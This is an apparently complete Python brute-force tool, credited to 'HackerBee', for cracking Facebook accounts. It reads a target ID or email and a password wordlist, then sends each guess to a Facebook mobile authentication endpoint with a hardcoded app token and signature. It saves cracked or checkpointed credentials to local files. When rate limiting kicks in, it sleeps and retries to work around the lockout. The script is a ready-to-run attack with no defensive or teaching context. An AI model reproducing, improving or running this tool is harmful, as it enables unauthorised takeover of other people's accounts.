#!/usr/bin/python
# coding=utf-

##### BRUTE FORCE #####
import os,sys,time,datetime,json
import requests
from requests.exceptions import ConnectionError
#from mechanize import Browser
#from multiprocessing.pool import ThreadPool

logo = """
	\033[1;93m:::::::::: :::::::::  :::::::::  :::    ::: ::::::::::: ::::::::::
	\033[1;93m:+:        :+:    :+: :+:    :+: :+:    :+:     :+:     :+:       
	\033[1;93m+:+        +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+       
	\033[1;93m:#::+::#   +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#  
	\033[1;93m+#+        +#+    +#+ +#+    +#+ +#+    +#+     +#+     +#+       
	\033[1;93m#+#        #+#    #+# #+#    #+# #+#    #+#     #+#     #+#       
	\033[1;93m###        #########  ###    ###  ########      ###     ##########\n
	\033[1;92m-----------------------Created by HackerBee-----------------------\n"""
                                                
def animation(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)

def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timeformat = '{:02d}:{:02d}'.format(mins, secs)
        print('\033[1;93m---------------',timeformat,'---------------', end='\r')
        time.sleep(1)
        t -= 1
    print('\033[1;90m	Resuming attack........',end=' ')
    
def brute():
	

	os.system('reset')
	print(logo)
	
	try:
		email = input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		bmsg = 'We limit how often you can post, comment or do other things in a given amount of time to help protect the community from spam. You can try again later. Learn More'
		total = total.readlines()
		#print (42*"\033[1;97m═"
		print("\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m ", email)
		print("\033[1;91m[+] \033[1;92mTotal\033[1;96m ",str(len(total))," \033[1;92mPassword")
		animation('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		plist = open(passw,"r")
		for pw in plist:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				##print mpsh
				##time.sleep(100)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print( "\n\033[1;91m[+] \033[1;92mFound 💪️")
					print( 42*"\033[1;97m═")
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					break
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecekpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print( "\n\033[1;91m[+] \033[1;92mFound 💪️")
					print( 42*"\033[1;97m═")
					print( "\033[1;91m[!] \033[1;93mAccount Checkpoint")
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					break
				elif bmsg in mpsh['error_data']:
					cnt = 0
					print("\n\033[1;91m[🗽️] \033[1;93mLog in attempt blocked 😫️. Going for a sleep \n")
					while bmsg in mpsh['error_data']:
						countdown(900)
						cnt=cnt+1
						print('[',cnt,']')
						#print("\n\033[1;91m[\033[1;96m"+str(cnt)+"\033[1;91m] \033[1;92mTrying again \033[1;91m: \033[1;97m",pw, end='\r')
						data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						mpsh = json.loads(data.text)
					
			except requests.exceptions.ConnectionError:
				print("\033[1;91m[!] Connection Error")
				time.sleep(1)
	except IOError:
		print ("\033[1;91m[!] File not found")
	input("\033[1;91m[!] Back")
	brute()
		
brute()
